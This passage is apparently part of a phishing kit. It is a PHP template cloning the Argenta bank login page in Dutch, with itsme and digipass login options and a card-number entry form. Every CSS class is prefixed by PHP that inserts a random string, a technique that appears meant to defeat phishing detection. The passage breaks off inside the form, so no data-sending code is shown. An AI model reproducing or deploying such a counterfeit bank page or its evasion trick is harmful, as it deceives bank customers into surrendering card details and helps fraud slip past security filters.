9671,37.8668104%2020.0799067,37.1144866%2020.0799067,36.1864481%20L20.0799067,30.8488265%20C20.2126836,29.6495091%2020.9562341,28.8719296%2022.1645038,28.8719296%20C23.4524397,28.8719296%2024.1561572,29.7154056%2024.1561572,31.2442059%20L24.1561572,36.1864481%20C24.1561572,37.1108472%2024.9111244,37.8602207%2025.8424237,37.8602207%20C26.7737229,37.8602207%2027.5286902,37.1108472%2027.5286902,36.1864481%20L27.5286902,33.5505856%20C28.1925746,36.4236757%2030.5161702,38.1369863%2033.6629824,38.1369863%20C35.1500836,38.1369863%2036.5575186,37.6888897%2037.5799007,36.9508482%20L37.6861222,36.8717723%20L37.7923437,36.7926964%20L37.7923437,36.7795171%20L37.9782313,36.647724%20C38.9607803,35.7515307%2038.3898397,34.0909374%2037.0620708,33.9196063%20C36.473212,33.8420167%2035.8897629,34.0960194%2035.5484143,34.5785719%20C35.1500836,35.0793858%2034.4861991,35.3693307%2033.5833163,35.3693307%20C32.016549,35.3693307%2031.0871108,34.3940616%2031.0074446,32.8916199%20L38.3500066,32.8916199%20C38.958651,32.8916199%2039.4520548,32.4018719%2039.4520548,31.797737%20L39.4520548,31.5209714%20C39.4520548,27.7253295%2037.1284592,25.4584877%2033.596594,25.4584877%20L33.5700386,25.4584877%20Z%20M31.0074446,30.5984196%20C31.1136662,29.0300814%2032.0696598,28.1338881%2033.5567609,28.1338881%20C35.1235282,28.1338881%2035.8803565,29.1091573%2035.9467449,30.5852403%20L31.0074446,30.5984196%20Z%27%20id=%27Shape%27%20fill=%27%23FFFFFF%27%3e%3c/path%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/svg%3e"
                                                                style="width: 24px; height: 24px; vertical-align: top;" />
                                                        </span>
                                                        <span
                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-body argnt-a-body__small argnt-a-body__bold argnt-m-skip-link__label">Aanmelden
                                                            met smartphone en itsme®</span>
                                                    </span>
                                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-skip-link__arrow">
                                                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-icon">
                                                            <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                                data-icon="chevron-right"
                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-chevron-right" role="img"
                                                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"
                                                                style="width: 24px; height: 24px;">
                                                                <path fill="currentColor"
                                                                    d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z">
                                                                </path>
                                                            </svg>
                                                        </span>
                                                    </span>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="aanmelden#digipass" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-skip-link">
                                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-skip-link__content">
                                                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-icon">
                                                            <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                                data-icon="calculator"
                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-calculator" role="img"
                                                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"
                                                                style="width: 24px; height: 24px;">
                                                                <path fill="currentColor"
                                                                    d="M352 160V448c0 17.7-14.3 32-32 32H64c-17.7 0-32-14.3-32-32V160H352zm0-32H32V64c0-17.7 14.3-32 32-32H320c17.7 0 32 14.3 32 32v64zm32 0V64c0-35.3-28.7-64-64-64H64C28.7 0 0 28.7 0 64v64 16 16V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160 144 128zM72 224a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zM264 416a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zM80 400c-8.8 0-16 7.2-16 16s7.2 16 16 16H208c8.8 0 16-7.2 16-16s-7.2-16-16-16H80z">
                                                                </path>
                                                            </svg>
                                                        </span>
                                                        <span
                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-body argnt-a-body__small argnt-a-body__bold argnt-m-skip-link__label">Aanmelden
                                                            met debetkaart en digipas</span>
                                                    </span>
                                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-skip-link__arrow">
                                                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-icon">
                                                            <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                                data-icon="chevron-right"
                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-chevron-right" role="img"
                                                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"
                                                                style="width: 24px; height: 24px;">
                                                                <path fill="currentColor"
                                                                    d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z">
                                                                </path>
                                                            </svg>
                                                        </span>
                                                    </span>
                                                </a>
                                            </li>
                                        </ul>
                                    </nav>
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-header argnt-m-header--mobile">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-header__logo">
                                            <a class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-logo argnt-a-logo--icon"
                                                href="https://www.argenta.be/nl.html" target="_blank">
                                                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> sr-only">Ga naar www.argenta.be</span>
                                                <svg class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg" xmlns="http://www.w3.org/2000/svg"
                                                    xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true">
                                                    <symbol id="symbol-logo-text__vgEcMWLP">
                                                        <path
                                                            d="M24.8316,40.3246757 L26.3295448,40.3246757 C27.2202583,40.3246757 30.4591326,40.2846385 30.4591326,37.3690533 C30.4591326,36.1044289 29.6089166,34.5551719 27.1392634,34.5551719 L24.8316,34.5551719 L24.8316,40.3246757 Z M29.8116338,47.6247984 L24.8720974,40.6318579 L24.8316,40.6318579 L24.8316,47.6247984 L22.6451297,47.6247984 L22.6451297,32.5365129 L27.2807743,32.5365129 C29.3861807,32.5365129 30.4793813,33.0457221 31.2686211,33.7997567 C32.2203108,34.717852 32.6453037,36.1044289 32.6453037,37.3690533 C32.6453037,41.366104 29.3254345,41.9968055 28.3537262,41.9968055 L32.5442902,47.6247984 L29.8116338,47.6247984 Z"
                                                            id="Fill-1__vgEcMWLP"></path>
                                                        <path
                                                            d="M44.7298761,36.3282692 C44.1026261,35.6352109 42.8472056,34.2691128 40.6407858,34.2691128 C37.5236338,34.2691128 35.0947082,36.9608116 35.0947082,40.1214522 C35.0947082,43.4452331 37.8273646,45.8921065 40.6614947,45.8921065 C41.0864876,45.8921065 44.3863382,45.8518391 45.8235369,42.1401112 L38.8395704,42.1401112 L38.8395704,40.1214522 L48.3132087,40.1214522 C48.2322139,45.1785693 44.2241184,47.9103053 40.5804998,47.9103053 C36.2081575,47.9103053 32.908307,44.3421592 32.908307,40.1214522 C32.908307,35.7778723 36.248655,32.2516042 40.5602511,32.2516042 C43.110439,32.2516042 45.8235369,33.6177024 47.2809844,36.3282692 L44.7298761,36.3282692 Z"
                                                            id="Fill-2__vgEcMWLP"></path>
                                                        <polygon id="Fill-3__vgEcMWLP"
                                                            points="49.0621812 47.6247063 49.0621812 32.5364209 57.1370474 32.5364209 57.1370474 34.5550799 51.2472018 34.5550799 51.2472018 38.9996733 57.1370474 38.9996733 57.1370474 41.0190226 51.2472018 41.0190226 51.2472018 45.6062774 57.1370474 45.6062774 57.1370474 47.6247063">
                                                        </polygon>
                                                        <polygon id="Fill-4__vgEcMWLP"
                                                            points="68.2103344 47.6247063 60.8020652 35.9612152 60.7608774 35.9612152 60.7608774 47.6247063 58.5744762 47.6247063 58.5744762 32.5364209 60.9638248 32.5364209 68.2515221 44.0160628 68.2913293 44.0160628 68.2913293 32.5364209 70.4777305 32.5364209 70.4777305 47.6247063">
                                                        </polygon>
                                                        <polygon id="Fill-5__vgEcMWLP"
                                                            points="73.7978298 47.6247063 73.7978298 34.5550799 70.9227421 34.5550799 70.9227421 32.5364209 78.8583984 32.5364209 78.8583984 34.5550799 75.984001 34.5550799 75.984001 47.6247063">
                                                        </polygon>
                                                        <path
                                                            d="M81.9902766,41.0228422 L81.9902766,35.4475421 L89.1534904,40.9945401 L81.9902766,41.0228422 Z M81.9875155,32.511248 L79.6216369,32.511248 L79.6216369,47.7477173 L81.9902766,47.7477173 L81.9902766,43.1507983 L91.9514949,43.1611528 L97.8735544,47.7477173 L101.25463,47.7477173 L81.9875155,32.511248 Z"
                                                            id="Fill-6__vgEcMWLP"></path>
                                                        <path
                                                            d="M19.263663,41.0228422 L12.1018298,40.9945401 L19.263663,35.4475421 L19.263663,41.0228422 Z M19.2668844,32.511248 L0,47.7477173 L3.38061535,47.7477173 L9.30313498,43.1611528 L19.263663,43.1507983 L19.263663,47.7477173 L21.6327629,47.7477173 L21.6327629,32.511248 L19.2668844,32.511248 Z"
                                                            id="Fill-7__vgEcMWLP"></path>
                                                        <polygon id="Fill-8__vgEcMWLP"
                                                            points="46.1574107 8.5663578 51.1480291 8.5663578 40.1704633 17.2643323 40.1711536 13.3093897">
                                                        </polygon>
                                                        <polygon id="Fill-9__vgEcMWLP"
                                                            points="58.5811491 27.9314714 53.5909908 27.9314714 64.5683265 19.2342103 64.5678663 23.1880024">
                                                        </polygon>
                                                        <polygon id="Fill-10__vgEcMWLP"
                                                            points="58.5818394 8.5663578 61.2539797 10.6828089 42.8214345 25.2877023 40.1711536 23.1877723 40.1711536 18.3156549 52.4754706 8.5663578">
                                                        </polygon>
                                                        <polygon id="Fill-11__vgEcMWLP"
                                                            points="61.9175854 11.2088154 64.5683265 13.3093897 64.5683265 18.1815071 52.2628591 27.9315175 46.1574107 27.9315175 43.4850402 25.8139158">
                                                        </polygon>
                                                        <polygon id="Fill-12__vgEcMWLP"
                                                            points="54.0926068 7.28516625 60.2118611 2.43605872 71.6618203 2.43605872 65.5434863 7.28516625">
                                                        </polygon>
                                                        <polygon id="Fill-13__vgEcMWLP"
                                                            points="52.7649352 0.978151092 53.9998768 0 53.9998768 6.30678506 52.7649352 7.28516625">
                                                        </polygon>
                                                    </symbol>
                                                    <symbol id="symbol-logo-icon__vgEcMWLP" fill-rule="evenodd">
                                                        <path
                                                            d="M18.472 25.7h14.972L.511 51.792l.002-11.865zM55.743 83.794h-14.97l32.932-26.091-.001 11.861zM55.746 25.7l8.016 6.348L8.464 75.863l-7.95-6.3V54.947l36.912-29.248zM65.753 33.626l7.952 6.302v14.617l-36.916 29.25H18.472l-8.017-6.353zM42.278 21.855L60.636 7.308h34.35L76.63 21.855zM38.295 2.934L42 0v18.92l-3.705 2.935z">
                                                        </path>
                                                    </symbol>
                                                    <svg class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> logo-full" id="logo-full__vgEcMWLP" viewBox="0 0 102 48"
                                                        preserveAspectRatio="xMinYMin meet">
                                                        <use xlink:href="#symbol-logo-text__vgEcMWLP" x="0" y="0"></use>
                                                    </svg>
                                                    <svg class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> logo-mobile" id="logo-mobile__vgEcMWLP"
                                                        viewBox="0 0 95 84" preserveAspectRatio="xMinYMin meet">
                                                        <use xlink:href="#symbol-logo-icon__vgEcMWLP" x="0" y="0"></use>
                                                    </svg>
                                                </svg>
                                            </a>
                                        </div>
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-header__actions">
                                            <button type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-language-selection" lang="fr">
                                                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-icon">
                                                    <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                        data-icon="globe" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-globe" role="img"
                                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"
                                                        style="width: 16px; height: 16px;">
                                                        <path fill="currentColor"
                                                            d="M256 480c16.7 0 40.4-14.4 61.9-57.3c9.9-19.8 18.2-43.7 24.1-70.7H170c5.9 27 14.2 50.9 24.1 70.7C215.6 465.6 239.3 480 256 480zM164.3 320H347.7c2.8-20.2 4.3-41.7 4.3-64s-1.5-43.8-4.3-64H164.3c-2.8 20.2-4.3 41.7-4.3 64s1.5 43.8 4.3 64zM170 160H342c-5.9-27-14.2-50.9-24.1-70.7C296.4 46.4 272.7 32 256 32s-40.4 14.4-61.9 57.3C184.2 109.1 175.9 133 170 160zm210 32c2.6 20.5 4 41.9 4 64s-1.4 43.5-4 64h90.8c6-20.3 9.3-41.8 9.3-64s-3.2-43.7-9.3-64H380zm78.5-32c-25.9-54.5-73.1-96.9-130.9-116.3c21 28.3 37.6 68.8 47.2 116.3h83.8zm-321.1 0c9.6-47.6 26.2-88 47.2-116.3C126.7 63.1 79.4 105.5 53.6 160h83.7zm-96 32c-6 20.3-9.3 41.8-9.3 64s3.2 43.7 9.3 64H132c-2.6-20.5-4-41.9-4-64s1.4-43.5 4-64H41.3zM327.5 468.3c57.8-19.5 105-61.8 130.9-116.3H374.7c-9.6 47.6-26.2 88-47.2 116.3zm-143 0c-21-28.3-37.5-68.8-47.2-116.3H53.6c25.9 54.5 73.1 96.9 130.9 116.3zM256 512A256 256 0 1 1 256 0a256 256 0 1 1 0 512z">
                                                        </path>
                                                    </svg>
                                                </span>
                                                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> sr-only">Modifiez la langue vers le français</span>
                                                <span
                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-body argnt-a-body__small argnt-a-body__semi-bold argnt-a-language-selection__label"
                                                    aria-hidden="true">Français</span>
                                            </button>
                                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-spacer"></span>
                                            <a target="_blank"
                                                href="https://www.argenta.be/nl/doe-het-zelf/internetbankieren.html?faqTopic=YWxs"
                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-link argnt-a-link--icon-position-left"
                                                aria-disabled="false">
                                                <span
                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-button-typography argnt-a-button-typography__link argnt-a-link__text">Help</span>
                                                <span
                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-link--content-icon argnt-a-link--content-icon-left">
                                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-link__icon argnt-a-icon">
                                                        <svg aria-hidden="true" focusable="false" data-prefix="fal"
                                                            data-icon="circle-question"
                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-circle-question" role="img"
                                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"
                                                            style="width: 16px; height: 16px;">
                                                            <path fill="currentColor"
                                                                d="M480 256A224 224 0 1 0 32 256a224 224 0 1 0 448 0zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm168.7-86.2c6.5-24.6 28.7-41.8 54.2-41.8H280c35.5 0 64 29 64 64.3c0 24-13.4 46.2-34.9 57.2L272 268.3V288c0 8.8-7.2 16-16 16s-16-7.2-16-16V258.5c0-6 3.4-11.5 8.7-14.3l45.8-23.4c10.7-5.4 17.5-16.6 17.5-28.7c0-17.8-14.4-32.3-32-32.3H222.9c-10.9 0-20.5 7.4-23.2 17.9l-.2 .7c-2.2 8.5-11 13.7-19.5 11.4s-13.7-11-11.4-19.5l.2-.7zM232 352a24 24 0 1 1 48 0 24 24 0 1 1 -48 0z">
                                                            </path>
                                                        </svg>
                                                    </span>
                                                </span>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </header>
                            <main class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> grid grid--justifyCenter argnt-p-login-page__flex-grow-1">
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> grid__cell grid__cell--lg-12">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-login-page__content-wrapper">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-login-page__content">
                                            <div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-p-login">
                                                    <h1
                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-heading argnt-a-heading-h2 argnt-a-heading__bold argnt-p-login__title">
                                                        Aanmelden op internetbankieren</h1>
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-login-component">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-announcements"></div>
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> sr-only">
                                                            <section class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-message argnt-a-message--error">
                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-message__icon-wrapper">
                                                                    <svg aria-hidden="true" focusable="false"
                                                                        data-prefix="fal" data-icon="circle-exclamation"
                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-circle-exclamation"
                                                                        role="img" xmlns="http://www.w3.org/2000/svg"
                                                                        viewBox="0 0 512 512">
                                                                        <path fill="currentColor"
                                                                            d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z">
                                                                        </path>
                                                                    </svg>
                                                                </div>
                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-message__body">
                                                                    <p role="alert"></p>
                                                                </div>
                                                            </section>
                                                        </div>
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-loader-wrapper">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse argnt-q-collapse--open"
                                                                aria-hidden="false"
                                                                style="overflow: visible; opacity: 1; height: auto;">
                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse__content">
                                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-login">
                                                                        <section id="itsme"
                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-itsme-login">
                                                                            <div
                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-item argnt-a-collapse-item--box-shadow">
                                                                                <h2
                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-item__header-as">
                                                                                    <button type="button"
                                                                                        id="itsme-collapse-control"
                                                                                        aria-expanded="false"
                                                                                        aria-controls="itsme-collapse-content"
                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-item__summary argnt-m-form-itsme-login__header"></button>
                                                                                </h2>
                                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse-transition argnt-q-collapse-transition--collapse argnt-a-collapse-item__transition-wrapper"
                                                                                    id="itsme-collapse-content"
                                                                                    role="region"
                                                                                    aria-labelledby="itsme-collapse-control"
                                                                                    aria-hidden="true" style="">
                                                                                    <div
                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-item__content">
                                                                                        <form
                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-container">
                                                                                            <div
                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-itsme-login__form">
                                                                                                <div
                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field-container argnt-a-field-container--gap-16">
                                                                                                    <label
                                                                                                        for="debitCardInputItsme">
                                                                                                        <span
                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-m-form-itsme-login__form__card-number-label">
                                                                                                            1. Vul je
                                                                                                            kaartnummer
                                                                                                            in
                                                                                                        </span>
                                                                                                    </label>
                                                                                                    <div
                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-m-form-card-numbers-drop-down">
                                                                                                        <div
                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-card-numbers-drop-down css-b62m3t-container">
                                                                                                            <span
                                                                                                                id="react-select-2-live-region"
                                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> css-7pg0cj-a11yText"></span>
                                                                                                            <span
                                                                                                                aria-live="polite"
                                                                                                                aria-atomic="false"
                                                                                                                aria-relevant="additions text"
                                                                                                                role="log"
                                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> css-7pg0cj-a11yText"></span>
                                                                                                            <div
                                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-card-numbers-drop-down__control css-13cymwt-control">
                                                                                                                <div
                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-card-numbers-drop-down__value-container argnt-a-card-numbers-drop-down__value-container--has-value css-hlgwow">
                                                                                                                    <div
                                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-masked-input-field argnt-a-masked-input-field__card">
                                                                                                                        <div
                                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field argnt-a-field--unstyled">
                                                                                                                            <div aria-hidden="true"
                                                                                                                                style="opacity: 0; display: none;">
                                                                                                                                <div
                                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field--fa-wrapper">
                                                                                                                                    <svg aria-hidden="true"
                                                                                                                                        focusable="false"
                                                                                                                                        data-prefix="fal"
                                                                                                                                        data-icon="xmark"
                                                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-xmark"
                                                                                                                                        role="img"
                                                                                                                                        xmlns="http://www.w3.org/2000/svg"
                                                                                                                                        viewBox="0 0 384 512">
                                                                                                                                        <path
                                                                                                                                            fill="currentColor"
                                                                                                                                            d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
                                                                                                                                        </path>
                                                                                                                                    </svg>
                                                                                                                                </div>
                                                                                                                            </div>
                                                                                                                            <div aria-hidden="true"
                                                                                                                                style="opacity: 0; display: none;">
                                                                                                                                <div
                                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field--fa-wrapper">
                                                                                                                                    <svg aria-hidden="true"
                                                                                                                                        focusable="false"
                                                                                                                                        data-prefix="fal"
                                                                                                                                        data-icon="circle-check"
                                                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-circle-check"
                                                                                                                                        role="img"
                                                                                                                                        xmlns="http://www.w3.org/2000/svg"
                                                                                                                                        viewBox="0 0 512 512">
                                                                                                                                        <path
                                                                                                                                            fill="currentColor"
                                                                                                                                            d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM363.3 203.3c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L224 297.4l-52.7-52.7c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6l64 64c6.2 6.2 16.4 6.2 22.6 0l128-128z">
                                                                                                                                        </path>
                                                                                                                                    </svg>
                                                                                                                                </div>
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                                <div
                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-card-numbers-drop-down__indicators css-1wy0on6">
                                                                                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-card-numbers-drop-down__indicator argnt-a-card-numbers-drop-down__dropdown-indicator css-1xc3v61-indicatorContainer"
                                                                                                                        aria-hidden="true">
                                                                                                                        <span
                                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-collapse-indicator">
                                                                                                                            <svg aria-hidden="true"
                                                                                                                                focusable="false"
                                                                                                                                data-prefix="fal"
                                                                                                                                data-icon="chevron-up"
                                                                                                                                class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-chevron-up"
                                                                                                                                role="img"
                                                                                                                                xmlns="http://www.w3.org/2000/svg"
                                                                                                                                viewBox="0 0 512 512"
                                                                                                                                style="
                                                                                                                                    transform: rotate(180deg);
                                                                                                                                    transition-property: transform;
                                                                                                                                    transition-duration: 175ms;
                                                                                                                                    transition-timing-function: ease-in-out;
                                                                                                                                ">
                                                                                                                                <path
                                                                                                                                    fill="currentColor"
                                                                                                                                    d="M244.7 116.7c6.2-6.2 16.4-6.2 22.6 0l192 192c6.2 6.2 6.2 16.4 0 22.6s-16.4 6.2-22.6 0L256 150.6 75.3 331.3c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6l192-192z">
                                                                                                                                </path>
                                                                                                                            </svg>
                                                                                                                        </span>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                            <input
                                                                                                                name="cardNumberInput"
                                                                                                                type="hidden"
                                                                                                                value="" />
                                                                                                        </div>

                                                                                                        <div
                                                                                                            role="alert">
                                                                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse argnt-q-collapse--closed"
                                                                                                                aria-hidden="true"
                                                                                                                style="overflow: hidden; opacity: 0; height: 0px;">
                                                                                                                <div
                                                                                                                    class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-q-collapse__content">
                                                                                                                    <span
                                                                                                                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> argnt-a-field-error">
                                                                                                                        <svg aria-hidden="true"
                                                                                                                            focusable="false"
                                                                                                                            data-prefix="fal"
                                                                                                                            data-icon="circle-exclamation"
                                                                                                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> svg-inline--fa fa-circle-exclamation"
